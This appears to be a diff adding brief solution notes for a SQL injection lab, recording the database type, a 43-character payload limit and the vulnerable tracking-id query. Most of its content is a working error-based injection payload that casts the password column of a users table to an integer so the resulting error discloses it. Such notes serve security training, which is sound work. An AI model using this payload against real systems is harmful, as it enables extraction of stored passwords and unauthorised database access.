@@ -1,0 +1,10 @@
+Notes :
+    Database version is not Oracle
+    the payload is truncated ; the LIMIT is 43 Chars
+
+provided query :
+    SELECT * FROM tracking WHERE id = 'atgLZDlZswsPV7Lr'
+
+
+
+'AND cast((select password from users) as int)=1--
